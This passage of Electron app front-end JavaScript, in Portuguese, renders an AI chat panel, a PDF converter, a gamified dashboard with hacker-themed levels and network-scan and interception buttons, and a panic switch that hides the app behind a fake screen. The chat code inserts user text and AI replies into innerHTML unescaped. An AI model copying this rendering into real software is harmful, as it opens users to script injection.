                lines[i] = '<li style="margin-bottom: 6px; line-height: 1.55;">' + content + '</li>';
            } else {
                lines[i] = '</ol>\n<ul style="margin: 10px 0; padding-left: 20px; list-style-type: disc; color: #1d1d1f;">\n<li style="margin-bottom: 6px; line-height: 1.55;">' + content + '</li>';
                inList = 'ul';
            }
        } else if (isNumbered) {
            let content = isNumbered[1];
            if (!inList) {
                lines[i] = '<ol style="margin: 10px 0; padding-left: 20px; list-style-type: decimal; color: #1d1d1f;">\n<li style="margin-bottom: 6px; line-height: 1.55;">' + content + '</li>';
                inList = 'ol';
            } else if (inList === 'ol') {
                lines[i] = '<li style="margin-bottom: 6px; line-height: 1.55;">' + content + '</li>';
            } else {
                lines[i] = '</ul>\n<ol style="margin: 10px 0; padding-left: 20px; list-style-type: decimal; color: #1d1d1f;">\n<li style="margin-bottom: 6px; line-height: 1.55;">' + content + '</li>';
                inList = 'ol';
            }
        } else {
            if (inList) {
                lines[i] = (inList === 'ul' ? '</ul>' : '</ol>') + '\n' + line;
                inList = false;
            }
        }
    }
    if (inList) {
        lines.push(inList === 'ul' ? '</ul>' : '</ol>');
    }
    html = lines.join('\n');

    // 7. Parágrafos
    let paragraphs = html.split(/\n\n+/);
    for (let j = 0; j < paragraphs.length; j++) {
        let p = paragraphs[j].trim();
        if (!p) continue;
        if (!p.startsWith('<ul') && !p.startsWith('<ol') && !p.startsWith('<h') && !p.startsWith('<div') && !p.startsWith('<blockquote') && !p.startsWith('</ul') && !p.startsWith('</ol')) {
            paragraphs[j] = '<p style="margin: 10px 0; line-height: 1.55; color: #1d1d1f;">' + p.replace(/\n/g, '<br>') + '</p>';
        } else {
            paragraphs[j] = p.replace(/\n/g, ' ');
        }
    }
    html = paragraphs.join('\n');

    return html;
}

function renderChatMessage(role, content, modelName = 'Agente IG') {
    const chatContainer = document.getElementById('ig-chat-messages');
    if (!chatContainer) return;

    const div = document.createElement('div');
    div.style.display = 'flex';
    div.style.flexDirection = 'column';
    
    if (role === 'user') {
        div.style.maxWidth = '80%';
        div.style.alignSelf = 'flex-end';
        div.innerHTML = `
            <div style="background: #007aff; color: #fff; padding: 12px 16px; border-radius: 18px 18px 0 18px; font-size: 14px; line-height: 1.4; box-shadow: 0 2px 8px rgba(0,122,255,0.15);">
                ${content.replace(/\\n/g, '<br>')}
            </div>
            <div style="font-size: 10px; color: #86868b; text-align: right; margin-top: 4px; padding-right: 4px;">Você</div>
        `;
    } else {
        div.style.maxWidth = '90%';
        div.style.width = '100%';
        div.style.alignSelf = 'flex-start';
        div.innerHTML = `
            <div style="background: #ffffff; border: 1px solid rgba(0,0,0,0.08); color: #1d1d1f; padding: 14px 18px; border-radius: 18px 18px 18px 0; font-size: 14px; line-height: 1.6; box-shadow: 0 2px 10px rgba(0,0,0,0.04); width: 100%;">
                ${parseMarkdown(content)}
            </div>
            <div style="font-size: 10px; color: #86868b; margin-top: 6px; padding-left: 6px; display: flex; align-items: center; gap: 4px;">
                <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 2a2 2 0 0 1 2 2c0 1.1-.9 2-2 2a2 2 0 0 1-2-2c0-1.1.9-2 2-2z"/><path d="M10 21.5c-1.3-.8-2.5-2.2-3.1-4.2-.6-2.1-.5-4.4.5-6.2 1-1.7 2.6-2.8 4.6-3 2-.2 4 .5 5.5 1.8 1.5 1.3 2.5 3.3 2.5 5.5 0 2.2-1.1 4.3-2.9 5.4"/><path d="M8.5 17c-1.5.8-3.4.6-4.7-.6-1.3-1.1-1.8-3-.9-4.6"/><path d="M15.5 17c1.5.8 3.4.6 4.7-.6 1.3-1.1 1.8-3 .9-4.6"/></svg>
                ${modelName}
            </div>
        `;
    }
    chatContainer.appendChild(div);
    chatContainer.scrollTop = chatContainer.scrollHeight;
}

let agentIgHistoryLoaded = false;
async function loadAgentIgHistory() {
    if (agentIgHistoryLoaded || !window.electronAPI) return;
    try {
        const history = await window.electronAPI.getChatHistory();
        const chatContainer = document.getElementById('ig-chat-messages');
        if (chatContainer) chatContainer.innerHTML = '';
        
        if (history.length === 0) {
            renderChatMessage('ig', 'Olá! Sou o IG, seu Agente de IA. Estou conectado às melhores IAs de código aberto do mundo.\n\nPara começar, escolha o modelo lá no topo e digite sua pergunta.', 'Sistema IG');
        } else {
            history.forEach(msg => {
                renderChatMessage(msg.role, msg.content, msg.modelName || 'Agente IG');
            });
        }
        agentIgHistoryLoaded = true;
    } catch (e) {
        console.error('Erro ao carregar histórico do agente:', e);
    }
}

document.getElementById('ig-chat-form')?.addEventListener('submit', async (e) => {
    e.preventDefault();
    const input = document.getElementById('ig-chat-input');
    const modelSelect = document.getElementById('agent-ig-model-select');
    if (!input || !modelSelect || !window.electronAPI) return;

    const text = input.value.trim();
    if (!text) return;

    input.value = '';
    renderChatMessage('user', text);

    // Loader temporário
    const chatContainer = document.getElementById('ig-chat-messages');
    const loadingDiv = document.createElement('div');
    loadingDiv.id = 'ig-chat-loading';
    loadingDiv.style.alignSelf = 'flex-start';
    loadingDiv.style.width = '100%';
    loadingDiv.innerHTML = `
        <div style="background: #ffffff; border: 1px solid rgba(0,0,0,0.08); padding: 12px 16px; border-radius: 18px 18px 18px 0; font-size: 14px; color: #86868b; display: flex; align-items: center; gap: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.04); max-width: 140px;">
            <div class="loader" style="width: 14px; height: 14px; border: 2px solid rgba(0, 122, 255, 0.2); border-top-color: #007aff; border-radius: 50%; animation: spin 1s linear infinite;"></div>
            Pensando...
        </div>
    `;
    chatContainer.appendChild(loadingDiv);
    chatContainer.scrollTop = chatContainer.scrollHeight;

    try {
        const reply = await window.electronAPI.sendChatMessage(text, modelSelect.value);
        if (loadingDiv.parentNode) loadingDiv.parentNode.removeChild(loadingDiv);
        
        if (typeof reply === 'object' && reply !== null) {
            renderChatMessage('ig', reply.text, reply.modelName);
        } else {
            renderChatMessage('ig', reply, 'Agente IG');
        }
    } catch (err) {
        if (loadingDiv.parentNode) loadingDiv.parentNode.removeChild(loadingDiv);
        renderChatMessage('ig', '⚠️ Erro ao comunicar com a IA.', 'Sistema');
    }
});

// ═════ ESTÚDIO PDF & DOCS ═════
const pdfDropzone = document.getElementById('pdf-dropzone');
const pdfFileInput = document.getElementById('pdf-file-input');
const pdfDropContent = document.getElementById('pdf-drop-content');
const pdfActionsPanel = document.getElementById('pdf-actions-panel');
const pdfSelectedFilename = document.getElementById('pdf-selected-filename');
const pdfSelectedFilesize = document.getElementById('pdf-selected-filesize');
const pdfConversionOptions = document.getElementById('pdf-conversion-options');
const pdfLoadingPanel = document.getElementById('pdf-loading-panel');
const pdfLoadingText = document.getElementById('pdf-loading-text');

let currentPdfFile = null;

if (pdfDropzone) {
    // Drag events
    pdfDropzone.addEventListener('dragover', (e) => {
        e.preventDefault();
        pdfDropzone.style.borderColor = '#3b82f6';
        pdfDropzone.style.background = 'rgba(59, 130, 246, 0.1)';
    });
    
    pdfDropzone.addEventListener('dragleave', (e) => {
        e.preventDefault();
        pdfDropzone.style.borderColor = 'rgba(255,255,255,0.2)';
        pdfDropzone.style.background = 'rgba(255,255,255,0.02)';
    });
    
    pdfDropzone.addEventListener('drop', (e) => {
        e.preventDefault();
        pdfDropzone.style.borderColor = 'rgba(255,255,255,0.2)';
        pdfDropzone.style.background = 'rgba(255,255,255,0.02)';
        if (e.dataTransfer.files && e.dataTransfer.files.length > 0) {
            handlePDFFile(e.dataTransfer.files[0]);
        }
    });

    pdfFileInput.addEventListener('change', (e) => {
        if (e.target.files && e.target.files.length > 0) {
            handlePDFFile(e.target.files[0]);
        }
    });
}

function resetPDFStudio() {
    currentPdfFile = null;
    pdfFileInput.value = '';
    pdfDropContent.style.display = 'block';
    pdfActionsPanel.style.display = 'none';
    pdfLoadingPanel.style.display = 'none';
}

function handlePDFFile(file) {
    currentPdfFile = file;
    pdfSelectedFilename.textContent = file.name;
    pdfSelectedFilesize.textContent = (file.size / (1024 * 1024)).toFixed(2) + ' MB';
    
    pdfDropContent.style.display = 'none';
    pdfActionsPanel.style.display = 'flex';
    
    // Configurar opções baseadas na extensão
    const ext = file.name.split('.').pop().toLowerCase();
    pdfConversionOptions.innerHTML = ''; // Clear old buttons

    const addOption = (label, actionTarget) => {
        const btn = document.createElement('button');
        btn.className = 'btn';
        btn.style.background = 'rgba(59, 130, 246, 0.2)';
        btn.style.color = '#fff';
        btn.style.borderColor = 'rgba(59, 130, 246, 0.5)';
        btn.textContent = label;
        btn.onclick = () => doPDFConversion(file, actionTarget);
        pdfConversionOptions.appendChild(btn);
    };

    if (ext === 'pdf') {
        addOption('Converter para Word (.docx)', 'pdf-to-docx');
        addOption('Converter para Texto (.txt)', 'pdf-to-txt');
    } else if (['doc', 'docx', 'rtf', 'txt'].includes(ext)) {
        addOption('Converter para PDF (.pdf)', 'docs-to-pdf');
    } else if (['jpg', 'jpeg', 'png'].includes(ext)) {
        addOption('Converter para PDF (.pdf)', 'img-to-pdf');
    } else {
        pdfConversionOptions.innerHTML = '<p style="color: #ef4444; grid-column: span 2;">Formato não suportado para conversão nativa.</p>';
    }
}

async function doPDFConversion(file, targetFormat) {
    pdfLoadingPanel.style.display = 'flex';
    if (targetFormat === 'pdf-to-docx') pdfLoadingText.textContent = 'Convertendo PDF para Word...';
    if (targetFormat === 'pdf-to-txt') pdfLoadingText.textContent = 'Extraindo texto do PDF...';
    if (targetFormat === 'docs-to-pdf') pdfLoadingText.textContent = 'Gerando PDF nativo...';
    if (targetFormat === 'img-to-pdf') pdfLoadingText.textContent = 'Transformando Imagem em PDF...';

    try {
        const result = await electronAPI.convertFile(file, targetFormat);
        pdfLoadingPanel.style.display = 'none';
        
        if (result.success) {
            alert('Conversão concluída com sucesso!\nSalvo em: ' + result.outputPath);
            resetPDFStudio();
        } else {
            alert('Erro na conversão: ' + result.message);
            pdfLoadingPanel.style.display = 'none';
        }
    } catch (e) {
        alert('Erro fatal: ' + e.message);
        pdfLoadingPanel.style.display = 'none';
    }
}

// ==========================================
// BENTO BOX DASHBOARD LOGIC
// ==========================================
// DOM já está pronto (script carregado no fim do body) — executa diretamente
{
    // Synchronize Bento Avatar and Name with Setup
    const updateBentoProfile = () => {
        const nameInput = document.getElementById('setup-username');
        const avatarImg = document.getElementById('avatar-preview');
        const bentoName = document.getElementById('bento-name');
        const bentoAvatar = document.getElementById('bento-avatar');
        
        if (nameInput && nameInput.value.trim() !== '') {
            bentoName.textContent = nameInput.value.trim();
        }
        if (avatarImg && avatarImg.src) {
            bentoAvatar.src = avatarImg.src;
        }
    };

    const profileHeader = document.getElementById('user-profile-header');
    if (profileHeader) {
        const observer = new MutationObserver(updateBentoProfile);
        const profileNameEl = document.getElementById('profile-name');
        if (profileNameEl) observer.observe(profileNameEl, { characterData: true, childList: true, subtree: true });
    }

    // Matrix Feed Logic
    const matrixContainer = document.getElementById('bento-matrix-feed');
    if (matrixContainer) {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()';
        
        const createMatrixLine = () => {
            const line = document.createElement('div');
            line.className = 'matrix-line';
            
            let text = '[sys] ';
            const len = Math.floor(Math.random() * 30) + 10;
            for(let i=0; i<len; i++) {
                text += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            if (Math.random() > 0.8) text += ' OK';
            else if (Math.random() > 0.9) text = '<span style="color:var(--red)">[WARN] ' + text + '</span>';
            
            line.innerHTML = text;
            matrixContainer.appendChild(line);
            
            if (matrixContainer.children.length > 6) {
                matrixContainer.removeChild(matrixContainer.firstChild);
            }
        };

        let matrixInterval;
        
        const checkDashboardActive = () => {
            const dash = document.getElementById('view-dashboard');
            if (dash && dash.classList.contains('active')) {
                if (!matrixInterval) {
                    matrixInterval = setInterval(createMatrixLine, 800);
                }
            } else {
                if (matrixInterval) {
                    clearInterval(matrixInterval);
                    matrixInterval = null;
                }
            }
        };

        document.querySelectorAll('.seg-btn').forEach(btn => {
            btn.addEventListener('click', () => setTimeout(checkDashboardActive, 100));
        });
        
        setTimeout(checkDashboardActive, 1000);
    }
}

// ==========================================
// GAMIFICATION "DARK" SYSTEM
// ==========================================

const LEVELS = [
    { level: 1, title: 'Operador', xpRequired: 0 },
    { level: 2, title: 'Analista Júnior', xpRequired: 50 },
    { level: 3, title: 'Batedor de Rede', xpRequired: 150 },
    { level: 4, title: 'Agente de Campo', xpRequired: 300 },
    { level: 5, title: 'Arquivista Fantasma', xpRequired: 500 },
    { level: 6, title: 'Hacker Tático', xpRequired: 750 },
    { level: 7, title: 'Engenheiro Sênior', xpRequired: 1000 },
    { level: 8, title: 'Mestre OSINT', xpRequired: 1300 },
    { level: 9, title: 'Sombra Digital', xpRequired: 1700 },
    { level: 10, title: 'Elite Cyberpunk', xpRequired: 2200 }
];

let currentXP = parseInt(localStorage.getItem('ig_xp') || '0', 10);

function getLevelInfo(xp) {
    let currentLvl = LEVELS[0];
    let nextLvl = LEVELS[1];
    for(let i=0; i<LEVELS.length; i++) {
        if(xp >= LEVELS[i].xpRequired) {
            currentLvl = LEVELS[i];
            nextLvl = LEVELS[i+1] || null;
        }
    }
    return { current: currentLvl, next: nextLvl };
}

function renderGamificationUI() {
    const info = getLevelInfo(currentXP);
    const badge = document.getElementById('bento-level-badge');
    const xpText = document.getElementById('bento-xp-text');
    const xpBar = document.getElementById('bento-xp-bar');
    
    if(badge) badge.textContent = `Nível ${info.current.level} - ${info.current.title}`;
    
    if(info.next) {
        const xpIntoLevel = currentXP - info.current.xpRequired;
        const xpNeeded = info.next.xpRequired - info.current.xpRequired;
        const pct = Math.min(100, Math.round((xpIntoLevel / xpNeeded) * 100));
        
        if(xpText) xpText.textContent = `${currentXP} / ${info.next.xpRequired} XP`;
        if(xpBar) xpBar.style.width = `${pct}%`;
    } else {
        // Max level
        if(xpText) xpText.textContent = `${currentXP} XP (MAX)`;
        if(xpBar) xpBar.style.width = `100%`;
    }

    // Unlocks
    if(info.current.level >= 10) {
        document.documentElement.classList.add('theme-cyberpunk');
    }
}

window.addXP = function(amount, reason) {
    currentXP += amount;
    localStorage.setItem('ig_xp', currentXP);
    
    // Toast
    const toast = document.createElement('div');
    toast.className = 'xp-toast';
    toast.innerHTML = `+${amount} XP <span style="font-size:10px; opacity:0.8; font-weight:normal; margin-left:6px;">${reason}</span>`;
    document.body.appendChild(toast);
    
    setTimeout(() => {
        if(toast.parentNode) toast.parentNode.removeChild(toast);
    }, 2500);

    renderGamificationUI();
};

setTimeout(() => {
    // Initial render
    renderGamificationUI();
    
    // Attach to specific buttons (if they exist)
    const scanBtn = document.getElementById('btn-run-scan');
    if(scanBtn) scanBtn.addEventListener('click', () => window.addXP(20, 'Varredura Concluída'));
    
    const scanLocalBtn = document.getElementById('btn-run-scan-local');
    if(scanLocalBtn) scanLocalBtn.addEventListener('click', () => window.addXP(15, 'Varredura Local'));
    
    const spectreBtn = document.getElementById('btn-start-spectre');
    if(spectreBtn) spectreBtn.addEventListener('click', () => window.addXP(50, 'Interceptação de Rede'));
    
    const pdfBtn = document.getElementById('btn-convert-pdf');
    if(pdfBtn) pdfBtn.addEventListener('click', () => window.addXP(10, 'Processamento Offline'));
}, 100);

// ═════ BOTÃO DO PÂNICO (KILL SWITCH) ═════
let isPanicMode = false;
if (window.electronAPI && window.electronAPI.onTogglePanic) {
    window.electronAPI.onTogglePanic(() => {
        isPanicMode = !isPanicMode;
        const appContainer = document.querySelector('.app');
        const panicView = document.getElementById('view-panic');
        
        if (isPanicMode) {
            // Esconde tudo e mostra o painel fake
            if (appContainer) appContainer.style.opacity = '0';
            if (panicView) {
                panicView.style.display = 'block';
                // Remove bg transparente do body
                document.body.style.background = '#ffffff';
            }
        } else {
            // Restaura
            if (panicView) panicView.style.display = 'none';
            if (appContainer) appContainer.style.opacity = '1';
            document.body.style.background = 'transparent';
        }
    });
}
